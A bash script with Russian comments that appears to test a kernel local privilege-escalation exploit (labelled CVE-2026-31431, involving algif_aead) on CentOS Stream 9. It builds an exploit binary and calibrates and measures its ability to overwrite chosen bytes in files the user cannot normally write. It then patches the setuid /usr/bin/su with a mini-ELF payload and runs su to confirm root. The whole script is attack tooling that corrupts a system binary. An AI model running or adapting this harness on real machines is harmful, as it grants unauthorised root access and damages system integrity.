#!/bin/bash
# Цикл тестов на cf-centos (Stream 9, ядро 5.14)
set -u
LOG=~/centos_tests.log
exec > >(tee -a $LOG) 2>&1

echo "================================================"
echo "=== ТЕСТЫ CVE-2026-31431 на $(hostname), $(date) ==="
echo "================================================"
cat /etc/os-release | grep PRETTY
uname -r
id

echo "--- algif_aead встроен? (не модуль):"
grep -i algif /proc/kallsyms | head -2 || sudo grep -i algif /proc/kallsyms | head -2
sudo grep algif_aead_init /proc/kallsyms | head -1

mkdir -p ~/exploit && cd ~/exploit
make 2>&1 | tail -1

echo "--- калибровка:"
for off in 0 4 100 1000 4090 8192; do
  head -c 9000 /dev/urandom > /tmp/c$off; chmod 644 /tmp/c$off
  hex=$(printf "%02x%02x%02x%02x" $((off%251)) $((off%241)) $((off%239)) $((off%233)))
  ./exploit /tmp/c$off $off $hex >/dev/null 2>&1
  found=$(python3 -c "d=open('/tmp/c$off','rb').read(); print(d.find(bytes.fromhex('$hex')))" 2>/dev/null || echo "нет python3")
  echo "  запрошено $off -> найдено $found"
done

echo "--- стабильность 10 прогонов:"
ok=0
for i in $(seq 1 10); do
  head -c 1200 /dev/urandom > /tmp/s$i; chmod 644 /tmp/s$i
  off=$((RANDOM % 1000))
  hex=$(printf "%02x%02x%02x%02x" $((off%251)) $((off%241)) $((off%239)) $((off%233)))
  ./exploit /tmp/s$i $off $hex >/dev/null 2>&1
  found=$(python3 -c "d=open('/tmp/s$i','rb').read(); print(d.find(bytes.fromhex('$hex')))" 2>/dev/null)
  [ "$found" = "$off" ] && ok=$((ok+1))
done
echo "  F1(centos): успешно $ok/10"

echo "--- полный LPE (патч su мини-ELF):"
md5sum /usr/bin/su
./exploit /usr/bin/su 0 -f payload_su.hex 2>&1 | tail -2
md5sum /usr/bin/su
stat -c "mtime: %y" /usr/bin/su
echo "id; echo ===ROOT_НА_CENTOS===; exit" | timeout 10 su 2>&1 | head -3
echo "=== КОНЕЦ ЦИКЛА ==="
